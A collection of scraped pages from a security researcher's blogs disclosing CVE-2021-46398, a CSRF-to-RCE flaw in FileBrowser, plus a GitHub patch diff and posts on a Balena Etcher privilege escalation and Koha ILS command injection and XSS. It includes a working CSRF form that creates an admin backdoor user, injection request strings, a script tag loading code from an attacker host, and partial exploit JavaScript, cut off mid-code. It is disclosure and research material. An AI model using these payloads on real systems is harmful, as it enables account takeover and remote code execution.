**Vendor/Software – Product Details**

Filebrowser provides a file managing interface within a specified directory and it can be used to upload, delete, preview, rename and edit your files. It allows the creation of multiple users and each user can have its own directory. It can be used as a standalone app or as a middleware.

Link**:** <https://filebrowser.org/>

**GitHub** **repo:** <https://github.com/filebrowser/filebrowser>

**The Vulnerability:** ***CSRF to RCE***

FileBrowser is a popular file manager/file managing interface developed in the Go language. Admin can create multiple users, even another Admin privileged user, and give access to any directory he wants, the user creation is handled by an endpoint “/api/users”.

The endpoint accepts input in JSON format to create users, but fails to verify that the “Content-Type” HTTP header, the Content-Type header’s value should be “application/json” but it accepts “text/plain” and that’s where the vulnerability arises. Also, the “Origin” is not validated and there are no anti-CSRF tokens implemented either.

Hence an attacker can easily exploit this vulnerability to create a backdoor user with admin privileges and access to the home directory or whichever directory the attacker wants to access, just by sending a malicious webpage URL to the legitimate admin and access the whole filesystem of the victim.

And an admin can run commands on the system, so this vulnerability leads to an RCE.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf_request-1.png?w=756)

**Affected Versions: *v2.17.2 and below versions were affected. =< 2.17.2***

**Proof Of Concept:** **The below HTML code will exploit the Flaw**
<html>

<body style=”text-align:center;”>
  <h1> FileBrowser CSRF PoC by Febin </h1>
    <form action=”<http://ubuntu.local:8080/api/users>” method=”POST” enctype=”text/plain”>

<input type=”hidden” name='{“what”:”user”,”which”:[],”data”:{“scope”:”../../../../root/”,”locale”:”en”,”viewMode”:”mosaic”,”singleClick”:false,”sorting”:{“by”:””,”asc”:false},”perm”:{“admin”:true,”execute”:true,”create”:true,”rename”:true,”modify”:true,”delete”:true,”share”:true,”download”:true},”commands”:[],”hideDotfiles”:false,”username”:”pwned”,”password”:””,”rules”:[{“allow”:true,”path”:”../”,”regex”:false,”regexp”:{“raw”:””}}],”lockPassword”:false,”id”:0,”password”:”pwned”}}’ value=’test’>
      <input type=”submit” value=”CLICK ME!”>
    </form>

</body>

</html>

**Exploit-DB:** <https://www.exploit-db.com/exploits/50717>

**1. I started a filebrowser instance inside my ubuntu VM**

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fb_csrf.png?w=942)

**2. I hosted the exploit on a simple HTTP server inside my host OS.**

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf1-1.png?w=1024)
![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf2.png?w=1024)

**3. When I click the “CLICK ME!” button, it sends a POST request in the background towards the filebrowser URL  and that creates a backdoor user named “pwned” with access to the “/root/” directory.**

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf3.png?w=648)
![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf4.png?w=1024)

Logged in as pwned user.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf_root.png?w=1024)

Root Cause:
1. X-Auth header is not validated properly

2. No Anti-CSRF token

3. Using content-type “text/plain” makes the attack possible

4. Origin header is not validated

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf_request.png?w=756)

**RCE:**

Refer:

<https://filebrowser.org/configuration/command-runner>

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/command-runner.png?w=855)

**PATCH**

Update to the latest version as the flaw has been patched from v2.18.0

Commit: <https://github.com/filebrowser/filebrowser/commit/74b7cd8e81840537a8206317344f118093153e8d>

**CVE-2021-46398**

**Thank you.**

Search for:

# Recent Posts

* [Privilege Escalation Vulnerability in Balena Etcher Software](https://febin0x4e4a.wordpress.com/2024/08/22/privilege-escalation-vulnerability-in-balena-etcher-software/)
* [CVE-2024-28739, CVE-2024-28740: XSS to One-Click RCE in Koha ILS](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/)
* [CVE-2023-44452, CVE-2023-51698: CBT File Parsing Argument Injection that affected Popular Linux Distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/)
* [CVE-2023-44451, CVE-2023-52076: EPUB File Parsing Directory Traversal RCE Vulnerability affecting popular distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/)
* [Zip Path Traversal in Asus Smartphone’s default FileManager App.](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/)
# Recent Comments

# Archives

* [August 2024](https://febin0x4e4a.wordpress.com/2024/08/)
* [March 2024](https://febin0x4e4a.wordpress.com/2024/03/)
* [January 2024](https://febin0x4e4a.wordpress.com/2024/01/)
* [December 2023](https://febin0x4e4a.wordpress.com/2023/12/)
* [October 2023](https://febin0x4e4a.wordpress.com/2023/10/)
* [September 2023](https://febin0x4e4a.wordpress.com/2023/09/)
* [January 2023](https://febin0x4e4a.wordpress.com/2023/01/)
* [March 2022](https://febin0x4e4a.wordpress.com/2022/03/)
* [January 2022](https://febin0x4e4a.wordpress.com/2022/01/)
# Categories

* [Uncategorized](https://febin0x4e4a.wordpress.com/category/uncategorised/)

[Create a free website or blog at WordPress.com.](https://wordpress.com/?ref=footer_website)

* Subscribe
  Subscribed

  + [![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/cropped-hacker-operate-laptop-cartoon-illustration_188898-166.jpg?w=50) febiNJ](https://febin0x4e4a.wordpress.com)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Ffebin0x4e4a.wordpress.com%2F2024%2F03%2F07%2Fxss-to-one-click-rce-in-koha-ils%2F&signup_flow=account)
* Privacy
* + [![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/cropped-hacker-operate-laptop-cartoon-illustration_188898-166.jpg?w=50) febiNJ](https://febin0x4e4a.wordpress.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Ffebin0x4e4a.wordpress.com%2F2024%2F03%2F07%2Fxss-to-one-click-rce-in-koha-ils%2F&signup_flow=account)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://febin0x4e4a.wordpress.com)
  + [View site in Reader](https://wordpress.com/read/blogs/201901473)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

![](https://pixel.wp.com/b.gif?v=noscript)
Design a site like this with WordPress.com[Get started](https://wordpress.com/start/?ref=marketing_bar)


=== Content from febin0x4e4a.blogspot.com_df20aaf5_20250114_220749.html ===

[Skip to main content](#main)

### Search This Blog

# [FebiNJ](https://febin0x4e4a.blogspot.com/)

InfoSec Enthusiast

### CVE-2021–46398 Critical CSRF to RCE in FileBrowser

* Get link
* Facebook
* X
* Pinterest
* Email
* Other Apps

-

[January 17, 2022](https://febin0x4e4a.blogspot.com/2022/01/critical-csrf-in-filebrowser.html "permanent link")

**Introduction**

This is *Febin*, a security professional.

I used to pick random opensource software for my research, recently I took some web-based file management software as my research targets. There I found some popular web-based file managers, one of them was a software named “FileBrowser”. While poking around I was able to find an awesome vulnerability in the application that leads to account takeover, complete access to the filesystem, and command execution. This article is going to be on that vulnerability.

[![](https://raw.githubusercontent.com/filebrowser/logo/master/banner.png)](https://raw.githubusercontent.com/filebrowser/logo/master/banner.png)
[![](https://user-images.githubusercontent.com/5447088/50716739-ebd26700-107a-11e9-9817-14230c53efd2.gif)](https://user-images.githubusercontent.com/5447088/50716739-ebd26700-107a-11e9-9817-14230c53efd2.gif)

**Disclosure Timeline:**

October 16, 2021 – Contacted the vendor and reported the vulnerability

October 19, 2021 – Vendor replies back

October 30, 2021 – Vulnerability has been patched in version **v2.18.0**

February 4, 2021 – CVE ID was assigned. CVE-2021-46398

**Vendor/Software – Product Details**

Filebrowser provides a file managing interface within a specified directory and it can be used to upload, delete, preview, rename and edit your files. It allows the creation of multiple users and each user can have its own directory. It can be used as a standalone app or as a middleware.

Link**:** <https://filebrowser.org/>

**GitHub** repo**:** <https://github.com/filebrowser/filebrowser>

**The Vulnerability:** ***CSRF to RCE***

FileBrowser is a popular file manager/file managing interface developed in the Go language. Admin can create multiple users, even another Admin privileged user, and give access to any directory he wants, the user creation is handled by an endpoint “/api/users”.

The endpoint accepts input in JSON format to create users, but fails to verify that the “Content-Type” HTTP header, the Content-Type header’s value should be “application/json” but it accepts “text/plain” and that’s where the vulnerability arises. Also, the “Origin” is not validated and there are no anti-CSRF tokens implemented either.

Hence an attacker can easily exploit this vulnerability to create a backdoor user with admin privileges and access to the home directory or whichever directory the attacker wants to access, just by sending a malicious webpage URL to the legitimate admin and access the whole filesystem of the victim.

And an admin can run commands on the system, so this vulnerability leads to an RCE.

![](https://febin0x4e4a.files.wordpress.com/2022/01/fbrowser_csrf_request-1.png?w=756)

**Affected Versions: *v2.17.2 and below versions were affected. =< 2.17.2***

**Proof Of Concept:** **The below HTML code will exploit the Flaw**
<html>

<body style=”text-align:center;”>
  <h1> FileBrowser CSRF PoC by Febin </h1>
    <form action=”<http://ubuntu.local:8080/api/users>” method=”POST” enctype=”text/plain”>

<input type=”hidden” name='{“what”:”user”,”which”:[],”data”:{“scope”:”../../../../root/”,”locale”:”en”,”viewMode”:”mosaic”,”singleClick”:false,”sorting”:{“by”:””,”asc”:false},”perm”:{“admin”:true,”execute”:true,”create”:true,”rename”:true,”modify”:true,”delete”:true,”share”:true,”download”:true},”commands”:[],”hideDotfiles”:false,”username”:”pwned”,”password”:””,”rules”:[{“allow”:true,”path”:”../”,”regex”:false,”regexp”:{“raw”:””}}],”lockPassword”:false,”id”:0,”password”:”pwned”}}’ value=’test’>
      <input type=”submit” value=”CLICK ME!”>
    </form>

</body>

</html>

**Exploit-DB:**  <https://www.exploit-db.com/exploits/50717>

**1. I started a filebrowser instance inside my ubuntu VM**

![](https://febin0x4e4a.files.wordpress.com/2022/01/fb_csrf.png?w=942)

**2. I hosted the exploit on a simple HTTP server inside my host OS.**

![](https://febin0x4e4a.files.wordpress.com/2022/01/fbrowser_csrf1-1.png?w=1024)
![](https://febin0x4e4a.files.wordpress.com/2022/01/fbrowser_csrf2.png?w=1024)

**3. When I click the “CLICK ME!” button, it sends a POST request in the background towards the filebrowser URL  and that creates a backdoor user named “pwned” with access to the “/root/” directory.**

![](https://febin0x4e4a.files.wordpress.com/2022/01/fbrowser_csrf3.png?w=648)
![](https://febin0x4e4a.files.wordpress.com/2022/01/fbrowser_csrf4.png?w=1024)

Logged in as pwned user.

![](https://febin0x4e4a.files.wordpress.com/2022/01/fbrowser_csrf_root.png?w=1024)

Root Cause:
1. X-Auth header is not validated properly

2. No Anti-CSRF token

3. Using content-type “text/plain” makes the attack possible

4. Origin header is not validated

![](https://febin0x4e4a.files.wordpress.com/2022/01/fbrowser_csrf_request.png?w=756)

**RCE:**

Refer:

<https://filebrowser.org/configuration/command-runner>

![](https://febin0x4e4a.files.wordpress.com/2022/01/command-runner.png?w=855)

**PATCH**

Update to the latest version as the flaw has been patched from v2.18.0

Commit: <https://github.com/filebrowser/filebrowser/commit/74b7cd8e81840537a8206317344f118093153e8d>

**CVE-2021-46398**

**Thank you.**

[CVE-2021–46398](https://febin0x4e4a.blogspot.com/search/label/CVE-2021%E2%80%9346398)
[Exploit](https://febin0x4e4a.blogspot.com/search/label/Exploit)
[Hacking](https://febin0x4e4a.blogspot.com/search/label/Hacking)
[Vulnerability Research](https://febin0x4e4a.blogspot.com/search/label/Vulnerability%20Research)

* Get link
* Facebook
* X
* Pinterest
* Email
* Other Apps

### Comments

#### Post a Comment

### Popular posts from this blog

### [Tiny File Manager Authenticated RCE](https://febin0x4e4a.blogspot.com/2022/01/tiny-file-manager-authenticated-rce.html)

-

[January 14, 2022](https://febin0x4e4a.blogspot.com/2022/01/tiny-file-manager-authenticated-rce.html "permanent link")

[![Image](https://lh3.googleusercontent.com/blogger_img_proxy/AEn0k_sha18bbSPbJ5nf9vWiSOtKwhMJsBlId4HZqNYmTIwTuTweUdvbMhJHZFZtcdW2EncutTK15RTn27KUu2-o2ozqmJj78Ft0HnO7Hddt92PNnohT83PDXG68AxOCtV7aaBI5tJKbkIRn7Vz9RvhxenEFQWKVrQSu5GH4lKui7LynZavp8WK-pJvj2l6StMnonA1SjV0Zt_86BgMTncilMjFcCmWOAm_x3hFq3rdYGeTCDF8kwOPOcOKUXGc-7g4P4sU2k5xSoRqrccUuoVmYh-KbtbtWO4UjhiqZo6rdt_qEnlz8OBZnGq-0iVIKg5Eu2PVaxXi_zFn-R8LL4azkke8n-cMXBfYfjP4IagOAznL70Q77HQHVdMe2dcEpsm6JcA6qaye7wZZautQ-7S-x4OY5KBrhTwdkXsz4IfmWSsxTXJH3oQaN7JteApYqg6SoPW3oCZcMe1LWVDMM0cztcnuzZw)](https://febin0x4e4a.blogspot.com/2022/01/tiny-file-manager-authenticated-rce.html)

  Introduction   This is Febin , a security professional. I used to pick random opensource software for my research, recently I took some web based file management software as my research targets. There I found some popular web-based file managers, one of which was a software named " Tiny File Manager " . While poking around I was able to find an awesome vulnerability in the application that leads to code execution on the server. This article is going to be on that vulnerability. Disclosure Timeline:   September 16, 2021 - Contacted the developer and reported the vulnerability September 17, 2021 - Developer replies back September 20, 2021 - Developer verified the issue September 26, 2021 - I patched the source code, fixed the RCE and sent a pull request the the original repository. November 12, 2021 - Developer merged the commit. The vulnerability has been fixed. Vendor/Software Details   TinyFileManager is web based file manager and it is a simple, fast and s...

[Read more](https://febin0x4e4a.blogspot.com/2022/01/tiny-file-manager-authenticated-rce.html "Tiny File Manager Authenticated RCE")

[Powered by Blogger](https://www.blogger.com)

### Labels

* [CVE-2021–46398](https://febin0x4e4a.blogspot.com/search/label/CVE-2021%E2%80%9346398)
* [Exploit](https://febin0x4e4a.blogspot.com/search/label/Exploit)
* [Hacking](https://febin0x4e4a.blogspot.com/search/label/Hacking)
* [Vulnerability Research](https://febin0x4e4a.blogspot.com/search/label/Vulnerability%20Research)

### [Report Abuse](https://www.blogger.com/go/report-abuse)



=== Content from github.com_fd571e3f_20250115_193701.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffilebrowser%2Ffilebrowser%2Fcommit%2F74b7cd8e81840537a8206317344f118093153e8d)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffilebrowser%2Ffilebrowser%2Fcommit%2F74b7cd8e81840537a8206317344f118093153e8d)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=filebrowser%2Ffilebrowser)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[filebrowser](/filebrowser)
/
**[filebrowser](/filebrowser/filebrowser)**
Public

* [Notifications](/login?return_to=%2Ffilebrowser%2Ffilebrowser) You must be signed in to change notification settings
* [Fork
  3.1k](/login?return_to=%2Ffilebrowser%2Ffilebrowser)
* [Star
   27.5k](/login?return_to=%2Ffilebrowser%2Ffilebrowser)

* [Code](/filebrowser/filebrowser)
* [Issues
  67](/filebrowser/filebrowser/issues)
* [Pull requests
  12](/filebrowser/filebrowser/pulls)
* [Discussions](/filebrowser/filebrowser/discussions)
* [Actions](/filebrowser/filebrowser/actions)
* [Security](/filebrowser/filebrowser/security)
* [Insights](/filebrowser/filebrowser/pulse)

Additional navigation options

* [Code](/filebrowser/filebrowser)
* [Issues](/filebrowser/filebrowser/issues)
* [Pull requests](/filebrowser/filebrowser/pulls)
* [Discussions](/filebrowser/filebrowser/discussions)
* [Actions](/filebrowser/filebrowser/actions)
* [Security](/filebrowser/filebrowser/security)
* [Insights](/filebrowser/filebrowser/pulse)

## Commit

[Permalink](/filebrowser/filebrowser/commit/74b7cd8e81840537a8206317344f118093153e8d)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

fix: security issue in command runner (closes [#1621](https://github.com/filebrowser/filebrowser/issues/1621))

[Browse files](/filebrowser/filebrowser/tree/74b7cd8e81840537a8206317344f118093153e8d)
Browse the repository at this point in the history

* Loading branch information

[![@o1egl](https://avatars.githubusercontent.com/u/966539?s=40&v=4)](/o1egl)

[o1egl](/filebrowser/filebrowser/commits?author=o1egl "View all commits by o1egl")
committed
Oct 31, 2021

1 parent
[6cb51b4](/filebrowser/filebrowser/commit/6cb51b4eb4751b49e7d3458c4a23589ccf16790b)

commit 74b7cd8

Showing
**1 changed file**
with
**6 additions**
and
**6 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

12 changes: 6 additions & 6 deletions

12
[http/commands.go](#diff-67667da4022421fda528838f98eaafc277a954b86857b96e7a5efd0939e20a54 "http/commands.go")

Show comments

[View file](/filebrowser/filebrowser/blob/74b7cd8e81840537a8206317344f118093153e8d/http/commands.go)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -59,19 +59,19 @@ var commandsHandler = withUser(func(w http.ResponseWriter, r \*http.Request, d \*d |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | if !d.server.EnableExec || !d.user.CanExecute(strings.Split(raw, " ")[0]) { |
|  |  | if err := conn.WriteMessage(websocket.TextMessage, cmdNotAllowed); err != nil { //nolint:govet |
|  |  | command, err := runner.ParseCommand(d.settings, raw) |
|  |  | if err != nil { |
|  |  | if err := conn.WriteMessage(websocket.TextMessage, []byte(err.Error())); err != nil { //nolint:govet |
|  |  | wsErr(conn, r, http.StatusInternalServerError, err) |
|  |  | } |
|  |  |  |
|  |  | return 0, nil |
|  |  | } |
|  |  |  |
|  |  | command, err := runner.ParseCommand(d.settings, raw) |
|  |  | if err != nil { |
|  |  | if err := conn.WriteMessage(websocket.TextMessage, []byte(err.Error())); err != nil { //nolint:govet |
|  |  | if !d.server.EnableExec || !d.user.CanExecute(command[0]) { |
|  |  | if err := conn.WriteMessage(websocket.TextMessage, cmdNotAllowed); err != nil { //nolint:govet |
|  |  | wsErr(conn, r, http.StatusInternalServerError, err) |
|  |  | } |
|  |  |  |
|  |  | return 0, nil |
|  |  | } |
|  |  |  |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `74b7cd8`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffilebrowser%2Ffilebrowser%2Fcommit%2F74b7cd8e81840537a8206317344f118093153e8d) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from febin0x4e4a.wordpress.com_8d9f3bd3_20250115_193555.html ===

# [febiNJ](https://febin0x4e4a.wordpress.com/)

## InfoSec Enthusiast

Menu
[Skip to content](#content)

* [Home](https://febin0x4e4a.wordpress.com/)
* [About](https://febin0x4e4a.wordpress.com/about/)

Search

Search for:

# Author: FebiNJ

# [Privilege Escalation Vulnerability in Balena Etcher Software](https://febin0x4e4a.wordpress.com/2024/08/22/privilege-escalation-vulnerability-in-balena-etcher-software/)

[22nd August 202422nd August 2024](https://febin0x4e4a.wordpress.com/2024/08/22/privilege-escalation-vulnerability-in-balena-etcher-software/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/08/22/privilege-escalation-vulnerability-in-balena-etcher-software/#respond)

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2024/08/etcher.webp?w=1024)

Local Privilege Escalation Vulnerability in Balena Etcher software in Ubuntu/Debian due to a race-condition issue.

Severity: **Medium**

Etcher is a popular cross-platform tool from balena.io to flash OS images onto SD cards and USB drives safely and easily. It is one of the most-popular USB flashing tools.

A Local Privilege Escalation flaw has been discovered in the latest version of Etcher <= v1.18.11 that allows an attacker with a low-privileged user account to create a directory named “etcher”
under /tmp, when the Admin user runs Etcher in his session, the attacker can achieve LPE.

This vulnerability arises due to the fact that, when someone runs Etcher, it creates a temporary directory under /tmp and writes a file under /tmp/etcher and the file will look something like “balena-etcher-electron-[random-uuid].cmd. Etcher then prompts for root/admin password, when admin enters the password, it then calls /tmp/etcher/balena-etcher-electron-[random-uuid].cmd and executes it with root privileges. Etcher then deletes the file and /tmp/etcher will be removed after a system reboot.

An attacker with a low-priv user account can exploit this behavior by creating his own /tmp/etcher directory, when the admin or any other user runs Etcher, it will write balena-etcher-electron-.cmd under attacker-owned /tmp/etcher directory.
The Attacker may not directly overwrite the file /tmp/etcher/balena-etcher-electron-[random-uuid].cmd because the file is created and owned by the admin or the user who ran Etcher, the attacker can just delete the /tmp/etcher directory as he is the owner of the directory and then he can again create /tmp/etcher directory and create a file that has exactly the same name as the file “balena-etcher-electron-[random-uuid].cmd” which is created by Etcher before. Etcher will then run the attacker’s malicious commands instead of the actual commands that are supposed to run.

Etcher creates the file before the password prompt and runs after the user enters the root/admin password, this is where the Race-Condition happens, attacker can create an automated script that creates /tmp/etcher and monitors it constantly, if a file is being created under /tmp/etcher it immediately deletes the directory and creates a fake /tmp/etcher/balena-etcher-electron-[random-uuid].cmd.

Limitation: The only limitation of the exploit is that while running the exploit, if there’s already /tmp/etcher present that means someone already ran Etcher Software before the exploit, a system reboot is required i.e., if there’s already a /tmp/etcher directory is present and that’s not owned by the attacker then the attacker should wait for a reboot.

Demo Scenario:

1. An attacker with a low privileged user (low-priv) access to the target.

2. Admin privileged user running etcher (adminuser) in Ubuntu.

Demo video: <https://github.com/febin0x10/etcher_privesc_exploit/raw/main/Etcher_privilege_escalation_linux_by_Febin.mp4>

Download Exploit: <https://github.com/febin0x10/etcher_privesc_exploit.git>

Software Information:

Etcher is a popular SD card flasher app that is simple for end users, extensible for developers, and works on any platform.

Official Website: <https://etcher.balena.io/>
Github Repo: <https://github.com/balena-io/etcher>
Download Vulnerable version(.deb): <https://github.com/balena-io/etcher/releases/download/v1.18.11/balena-etcher_1.18.11_amd64.deb>

Update Etcher to its latest version!

# [CVE-2024-28739, CVE-2024-28740: XSS to One-Click RCE in Koha ILS](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/)

[7th March 202417th April 2024](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/#respond)

```
![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2024/03/koha2.png)

PART-1 (Arbitrary Command Injection) [CVE-2024-28739]

An Arbitrary Command injection vulnerability has been discovered in the latest version (23.05) of Koha ILS. The vulnerability is present in the Task Scheduler feature, which allows arbitrary input from the user and appends it to a system command.
An Attacker can Schedule a task and intercept and modify the HTTP request using a proxy tool like BurpSuite and inject arbitrary system commands with backticks (`) inside the "format=" parameter, the arbitrary command will then execute on the system at the scheduled time.

Severity: HIGH

The HTTP request will look something like this:

mode=job_add&starttime=09%3A40&startdate=&report=1&format=text`[Arbitrary Command here]`&email=

The command Task Scheduler is scheduling a command on the system that will look something like this:

export KOHA_CONF="/etc/koha/sites/library/koha-conf.xml"; /usr/share/koha/bin/cronjobs/runreport.pl 1 --format=text --to=

Steps to Reproduce:

1. Log in to Koha Intranet as Admin Staff
2. Go to Task Scheduler (/cgi-bin/koha/tools/scheduler.pl)
3. Schedule a task, and set the time for the job to execute (current server time+2 minutes)
4. Intercept the HTTP Request and Inject any arbitrary command

mode=job_add&starttime=[TIME here]&startdate=&report=1&format=text`[Arbitrary Command here]`&email=

5. Forward the request.
6. Important thing to note here is that this is a Blind Arbitrary Command Injection i.e., we wouldn't be able to see the command output but it will execute anyways. So use "whoami>/tmp/whoami.txt" as the injection command.

mode=job_add&starttime=09%3A40&startdate=&report=1&format=text`whoami+>/tmp/whoami.txt`&email=

7. Wait for some time and you will be able to see a file named whoami.txt being created in/tmp directory on the target server, if you read it will see "library-koha"(koha system username).

PART-2 (XSS to RCE) [CVE-2024-28740]

The above command injection vulnerability can only be exploited if the adversary has the credentials for the Koha Intranet Staff Admin user! Any ways to exploit this without having credentials? The answer is yes! We can trigger this RCE vulnerability just by sending the admin a URL/Link.

This can be achieved by abusing the "Additional contents (HTML customizations)" feature in Koha. This is basically a Cross-Site Scripting (XSS) vulnerability that can be used to bypass CSRF protections in Koha (SameSite=Lax cookie attribute and csrf_token). The HTML customizations feature allows the admin to add HTML content, it also accepts custom javascript.

This is where the problem arises, the attacker can carefully craft a URL with some malicious javascript that adds a task to Task Scheduler to trigger the Command Injection Vulnerability when the admin Staff patron loads the URL in his browser with an authenticated session of Koha, it will add the malicious script to "Additional contents" and the javascript will be executed. In this way, the attacker can gain access to the target system.

In fact, there's an httpOnly flag set for the cookie by Koha and Javascript can't just read the session cookie, this XSS can also be used to steal the CSRF token and forcefully change username and password to completely takeover the Admin Staff account.

If there is Plugin upload feature enabled by the admin, this can be used to drop a malicious plugin to Koha in the background to achieve Remote Code Execution on the target system.

 Proof-Of-Concept:

1. Open Koha Intranet URL
2. Navigate to
[Your Koha domainname]/cgi-bin/koha/tools/additional-contents.pl?op=add_validate&category=html_customizations&code=&idnew=38&redirect=/&editmode=wysiwyg&location=&&title_default=test&content_default=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&lang=default

This will execute a simple javascript alert to prove the existence of the vulnerability

I have developed fully working exploits for all the above issues (Authenticated RCE, XSS to RCE, XSS to Account takeover, XSS to plugin upload RCE),

i) I have developed Javascript code that directly uploads malicious plugins to Koha and enables the plugin without any Account takeover.

ii) To reproduce the issue, you may host the JS code yourself and include it in the XSS payload like '<script src="http://your.attacker.machine/xsrf_plugin.js"></script>'

xsrf_plugin.js:

-----------------------------------------------------------------
```
function csrf_to_rce(){

function dataURItoBlob(dataURI) {

  var byteString;

  if (dataURI.split(',')[0].indexOf('base64') >= 0)
    byteString = atob(dataURI.split(',')[1]);
  else
    byteString = unescape(dataURI.split(',')[1]);

  // separate out the mime component
  var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];

  // write the bytes of the string to a typed array
  var ia = new Uint8Array(byteString.length);

